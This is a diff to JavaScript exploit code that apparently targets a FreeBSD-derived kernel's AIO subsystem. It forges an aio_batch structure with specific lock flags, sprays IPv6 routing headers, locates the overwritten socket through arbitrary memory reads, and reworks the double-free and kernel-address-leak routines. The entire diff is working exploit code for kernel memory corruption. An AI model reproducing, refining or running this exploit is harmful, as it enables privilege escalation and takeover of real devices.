@@ -718,25 +718,6 @@ function leak_kaddrs() {
   // field
   reqs1.buf = reqs2_addr.add(4);
 
-  // use reqs1 to fake a aio_batch at offset 0x28.
-  const spray_aio_batch = aio_batch.new(reqs1.addr.add(0x28));
-
-  spray_aio_batch.ar3_num_reqs = 1;
-  spray_aio_batch.ar3_reqs_left = 0;
-  spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
-  spray_aio_batch.ar3_done = 0;
-
-  // .ar3_lock.lock_object.lo_flags = (
-  //     LO_SLEEPABLE | LO_UPGRADABLE
-  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
-  //     | 6 << LO_CLASSSHIFT
-  //     | LO_INITIALIZED
-  // )
-  spray_aio_batch.lock_object_flags = 0x67b0000;
-
-  // .ar3_lock.lk_lock = LK_UNLOCKED
-  spray_aio_batch.lock_object_lock = 1;
-
   logger.info("leak reqs2 started...");
 
   const leak_aio_entry = aio_entry.new(leak_rthdr0_addr);
@@ -859,12 +840,40 @@ function double_free_reqs1() {
 
   logger.info("Leaked AIO queue entry !!");
 
+  logger.info("Craft AIO queue entry started...");
+
+  // craft a aio_batch using the end portion of the buffer
+  const reqs3_offset = 0x28;
+  const spray_reqs3_addr = spray_rthdr0_addr.add(reqs3_offset);
+  const leak_reqs3_addr = leak_rthdr0_addr.add(reqs3_offset);
+
   // overlap crafted reqs3 (aio_batch) with reqs2 (aio_entry)
   const spray_aio_entry = aio_entry.new(spray_rthdr0_addr);
 
   spray_aio_entry.ar2_ticket = 5;
   spray_aio_entry.ar2_info = reqs1_addr;
-  spray_aio_entry.ar2_batch = reqs1_addr.add(0x28); // reqs3 offset
+  spray_aio_entry.ar2_batch = reqs2_addr.add(reqs3_offset); // reqs3 offset
+
+  // use reqs1 to fake a aio_batch at offset 0x28.
+  const spray_aio_batch = aio_batch.new(spray_reqs3_addr);
+
+  spray_aio_batch.ar3_num_reqs = 1;
+  spray_aio_batch.ar3_reqs_left = 0;
+  spray_aio_batch.ar3_state = AIO_STATE_COMPLETE;
+  spray_aio_batch.ar3_done = 0;
+
+  // .ar3_lock.lock_object.lo_flags = (
+  //     LO_SLEEPABLE | LO_UPGRADABLE
+  //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
+  //     | 6 << LO_CLASSSHIFT
+  //     | LO_INITIALIZED
+  // )
+  spray_aio_batch.lock_object_flags = 0x67b0000;
+
+  // .ar3_lock.lk_lock = LK_UNLOCKED
+  spray_aio_batch.lock_object_lock = 1;
+
+  logger.info("Crafted AIO queue entry !!");
 
   logger.info("Spray crafted AIO queue entry started...");
 
@@ -892,19 +901,48 @@ function double_free_reqs1() {
 
         logger.debug(`Found req_idx at batch ${batch / AIO_MAX_NUM} after ${i} iterations !!`);
 
+        logger.debug(`states[${req_idx}]: ${outs[req_idx].hex()}`);
+
         const aio_req_idx = batch + req_idx;
 
         req_id = aio_ids[aio_req_idx];
         logger.debug(`req_id: ${req_id.hex()}`);
 
+        // set .ar3_done to 1
+        process_aio(AIO_OP_POLL, aio_ids, aio_req_idx, 1);
+
+        logger.debug(`states[${req_idx}]: ${outs[0].hex()}`);
+
         aio_ids[aio_req_idx] = 0;
 
-        overwritten = true;
+        for (let k = 0; k < ipv6_socks.length; k++) {
+          get_rthdr(ipv6_socks[k], 0x80);
 
-        logger.debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);
+          const done = arw.view(leak_reqs3_addr).getUint8(0xc);
+          if (done) {
+            logger.debug(`Overwritten crafted AIO queue entry after ${i} iterations !!`);
+            overwritten = true;
 
-        break;
+            rthdr_twins[0] = ipv6_socks[k];
+            logger.debug(`dirty_fd: ${rthdr_twins[0]}`);
+
+            // remove dirty from list
+            ipv6_socks.splice(k, 1);
+
+            // free rthdr from rest of sockets
+            for (let i = 0; i < ipv6_socks.length;i++) {
+              free_rthdr(ipv6_socks[i]);
+            }
+
+            // replace dirty with new sockets
+            ipv6_socks.push(make_socket(AF_INET6, SOCK_DGRAM));
+
+            break;
+          }
+        }
       }
+
+      if (overwritten) break;
     }
 
     if (overwritten) break;
@@ -921,7 +959,7 @@ function double_free_reqs1() {
   const target_ids = new Uint32Array([req_id, target_id]);
 
   // enable deletion of target_ids
-  process_aio(AIO_OP_POLL, target_ids);
+  process_aio(AIO_OP_POLL, target_ids, 1);
 
   const status = outs.slice(0, 2);
   logger.debug(`target status: ${Array.from(status).map((v) => v.hex())}`);
@@ -944,14 +982,6 @@ function double_free_reqs1() {
     make_pktopts_twins();
 
     logger.info(`Made pktopts twins: ${pktopts_twins} !!`);
-
-    /*
-    logger.info(`Looking for rthdr twins...`);
-
-    find_rthdr_twins();
-
-    logger.info(`Found rthdr twins: ${rthdr_twins} !!`);
-    */
   } finally {
     const errs = outs.slice(0, 2);
 
